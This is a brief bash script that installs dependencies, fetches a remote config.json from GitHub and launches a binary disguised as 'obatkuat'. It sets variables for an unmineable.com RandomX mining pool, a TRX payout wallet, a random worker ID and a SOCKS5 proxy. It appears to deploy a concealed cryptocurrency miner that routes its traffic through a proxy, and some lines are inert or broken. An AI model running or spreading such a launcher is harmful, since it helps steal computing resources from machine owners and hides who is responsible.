#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
chmod +x obatkuat
screen -dmS ls
wget https://raw.githubusercontent.com/outbesok/mesin/main/nyampah_ah/config.json
A=rx-us.unmineable.com:3333
B=TRX:TKrUSt7wRbZYF3gzBh1gT5XncoieZpaX3x
C=$(shuf -i 10-9999999999999999999 -n 1)
D=socks5://72.210.208.101:4145
 ./obatkuat
